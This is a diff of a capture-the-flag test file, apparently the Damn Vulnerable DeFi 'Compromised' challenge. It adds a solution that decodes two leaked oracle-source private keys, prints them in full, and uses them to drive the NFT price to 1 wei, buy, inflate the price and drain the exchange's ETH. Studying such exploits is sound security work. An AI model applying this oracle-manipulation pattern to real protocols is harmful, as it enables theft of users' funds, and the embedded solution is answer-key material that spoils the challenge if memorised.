@@ -33,7 +33,7 @@ describe('Compromised challenge', function () {
         
         // Deploy the oracle and setup the trusted sources with initial prices
         const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
-        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
+        oracle = (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
             await (await TrustfulOracleInitializerFactory.deploy(
                 sources,
                 ['DVNFT', 'DVNFT', 'DVNFT'],
@@ -46,13 +46,43 @@ describe('Compromised challenge', function () {
             oracle.address,
             { value: EXCHANGE_INITIAL_ETH_BALANCE }
         );
-        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
+        nftToken = (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
         expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
         expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Taking a look at the instructions provided for this challenge, and specially at the HTTP response, we can see that the body looks like ASCII chars in hex.
+        // Converting the hex to ASCII, we get a non-sense message.
+        // Base64 decoding the string (I tried this since its a really common encoding used on the web), we get two ETH private keys.
+        // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        // Assuming (could check beforehand) they are from the oracle's trusted sources, we can get it to change the price as we wish, since we have 2/3 of the sources under our control.
+
+        // Instantiate the two compromised trusted sources
+        const source1 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)
+        const source2 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider)
+
+        // Change the median price reported by the oracle to 1 wei
+        await oracle.connect(source1).postPrice("DVNFT", 1)
+        await oracle.connect(source2).postPrice("DVNFT", 1)
+
+        // Buy an NFT (id=0, could also get it from the event in the tx receipt) for 1 wei
+        await exchange.connect(player).buyOne({ value: 1 })
+
+        // Change the price back to normal (+ 1, to completely drain the contract)
+        await oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE + 1n)
+        await oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE + 1n)
+
+        // Sell the NFT and get all the ETH from the exchange
+        await nftToken.connect(player).approve(exchange.address, 0)
+        await exchange.connect(player).sellOne(0)
+
+        // Change the price back to normal to pass the challenge
+        await oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE)
+        await oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE)
     });
 
     after(async function () {
